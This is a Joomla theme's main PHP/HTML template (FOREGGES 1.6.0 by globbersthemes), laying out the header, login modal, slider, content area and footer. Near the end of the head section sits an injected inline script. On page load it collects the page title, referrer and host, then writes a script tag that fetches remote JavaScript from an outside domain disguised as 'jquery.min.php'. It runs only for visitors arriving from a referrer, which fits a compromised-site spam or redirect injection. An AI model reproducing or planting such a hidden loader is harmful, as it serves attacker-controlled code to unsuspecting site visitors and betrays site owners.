<?php
/****************************************************
#####################################################
##-------------------------------------------------##
##           FOREGGES- Version 1.6.0               ##
##-------------------------------------------------##
## Copyright = globbersthemes.com- 2011            ##
## Date      = Mars 2011                           ##
## Author    = globbers                            ##
## Websites  = http://www.globbersthemes.com       ##
##                                                 ##
#####################################################
****************************************************/
// no direct access
defined('_JEXEC') or die('Restricted access');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="<?php echo _LANGUAGE; ?>" xml:lang="<?php echo _LANGUAGE; ?>">
<head>
<jdoc:include type="head" />
		<?php JHTML::_('behavior.framework', true); 
	    $app = JFactory::getApplication();
        $templateparams = $app->getTemplate(true)->params;
	?>
	
<?php //setting slide fading
$interval= $this->params->get("interval", "3000");
$autoplay= $this->params->get("autoplay", 1);
$duration= $this->params->get("duration", "500");
?>

<?php
#main width#
$mod_right = $this->countModules( 'right' );
if ( $mod_right ) { $width = '';
} else { $width = '-full';

}
?>

	
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/foregges/css/tdefaut.css" type="text/css" media="all" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/foregges/css/box.css" type="text/css" media="all" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/foregges/css/joomlastyle.css" type="text/css" media="all" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/foregges/css/menu.css" type="text/css" media="all" />
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/mootools.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/cufon-yui.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/cufon-replace.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/Futura_Lt_BT_400.font.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/Futura_Black_Narrow_700.font.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/script.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/scroll.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/_class.noobSlide.js"></script>
<script type="text/javascript" src="templates/<?php echo $this->template ?>/js/DD_roundies_0.0.2a-min.js"></script>


<script type="text/javascript">
DD_roundies.addRule('.readmore a, ul.pagination a, ul.pagenav li ', '10px', true);
</script>

 <script type="text/javascript">
        window.addEvent('domready', function() {
        SqueezeBox.initialize({});
        $$('a.modal').each(function(el) {
            el.addEvent('click', function(e) {
                new Event(e).stop();
                 SqueezeBox.fromElement(el);
            });
         });
      });
    </script>

	<script type="text/javascript">
		// initialise plugins
		jQuery(function(){
			jQuery('ul.navigation').superfish();
            });
		</script>

 
<!--[if IE 7]>
<link href="templates/<?php echo $this->template ?>/css/ie7.css" rel="stylesheet" type="text/css" />
<![endif]-->


<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://alfabet.home.pl/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
<body>
    <div id="header">
        <div class="pagewidth">
		    <div id="header-content">
			    <div id="header-top">
				    <div id="menu-top">
                        <jdoc:include type="modules" name="user6" />
			        </div>
					    <div id="loginbt">
                            <div  class="text-login">	<a href="#helpdiv" class="modal"  style="cursor:pointer" title="Login"  rel="{size: {x: 206, y: 333}, ajaxOptions: {method: &quot;get&quot;}}">
                                 LOGIN / REGISTER</a>
							</div>
                        </div>
                            <div style="display:none;">
                                <div id="helpdiv" >
                                    <jdoc:include type="modules" name="login" style="xhtml" />
                                </div>
                            </div>
				</div>
				    <div id="header-center">
					    <div id="sitename">
                            <a href="index.php"><img src="templates/<?php echo $this->template ?>/images/logo.png" width="326" height="110" alt="logotype" /></a>
                        </div>
						
						<div id="download">
                            <a href="http://www.globbersthemes.com"><img src="templates/<?php echo $this->template ?>/images/download.png" width="190" height="118" alt="download this template" /></a>
                        </div>
					</div>
					    <div id="header-bottom">
					        <ul class="navigation"> 
		                        <jdoc:include type="modules" name="user1" />
	                        </ul>
			            </div>
		    </div>
	    </div>
	</div>
	    <div class="pagewidth">
	        <?php if ($this->countModules( 'tab1 or tab2 or tab3' )) : ?>
			    <div id="slide">
					<div class="joomscontmask1">
		                <div id="joomscontbox1">
						
						     <?php if ($this->countModules('tab1')) { ?> 
					        <div class="inner">
							    <jdoc:include type="modules" name="tab1" style="xhtml" />
					        </div>
							 <?php } ?>
							 
							   <?php if ($this->countModules('tab2')) { ?> 
							<div class="inner">
							    <jdoc:include type="modules" name="tab2" style="xhtml" />
					        </div>
							 <?php } ?>
							 
							   <?php if ($this->countModules('tab3')) { ?> 
				            <div class="inner">
							    <jdoc:include type="modules" name="tab3" style="xhtml" />
					        </div>
							 <?php } ?>
							 
					    </div>
	                </div>
					    <div id="prev1" class="prev1">
                            </div>
			            <div id="next1" class="next1">
				            </div>
				</div>
		    <?php endif; ?>
                            <script type="text/javascript">
                                window.addEvent('domready',function(){
								var hs1 = new noobSlide({
	                            box: $('joomscontbox1'),
		                        items:[1,2,3],
		                        size: 600,
		                        autoPlay:<?php echo $autoplay ?>, // true,
		                        interval:<?php echo $interval ?>, // 3000,
		                        fxOptions: {
			                        duration:<?php echo $duration ?>, // 500,
			                        transition: Fx.Transitions.Sine.easeOut,
			                         wait: false
		                        },
		                        buttons: {
			                        previous: $('prev1'),
			                        next: $('next1')
		                                     }
										});
                                    });
                            </script>
							<?php if ($this->countModules( 'user2' )) : ?>
							        <div id="newsflash">
								        <jdoc:include type="modules" name="user2" style="xhtml" />
								    </div>
							    <?php endif; ?>
								    <div id="main<?php echo $width; ?>">
                                        <jdoc:include type="component" />
                                    </div>
								    <?php if ($this->countModules( 'right' )) : ?>
						                <div id="right">
								            <jdoc:include type="modules" name="right" style="xhtml" />
								        </div>
						            <?php endif; ?>
		</div>
		    <div id="footer">
			    <div class="pagewidth">
					<div id="footer-top">
						<div id="pathway">
						    <jdoc:include type="modules" name="breadcrumb"  />
						</div>
							<div id="search">
								<jdoc:include type="modules" name="user4"  />
							</div>
					</div>
					    <div id="users-box">
				            <div class="box">
						        <jdoc:include type="modules" name="user3" style="xhtml" />
					        </div>
					        
					        <div class="box">
						         <jdoc:include type="modules" name="user5" style="xhtml" />
					        </div>
					        
					        <div class="box">
						        <jdoc:include type="modules" name="user7" style="xhtml" />
					        </div>
						
				        </div>
							<div id="footer-bottom">
				                <div class="ftb">
                                    Copyright&copy; <?php echo date( '2008 - Y' ); ?> globbers .&nbsp;design by globbers for <a target=" _blank"  href= "http://www.globbersthemes.com" > globbersthemes</a>
                                </div>
                                    <div id="top">
                                        <div class="top_button">
                                            <a href="#" onclick="scrollToTop();return false;">
						                    <img src="templates/<?php echo $this->template ?>/images/top.png" width="30" height="30" alt="top" /></a>
                                         </div>
					                </div>
				            </div>
				</div>
			</div>
</body>
</html>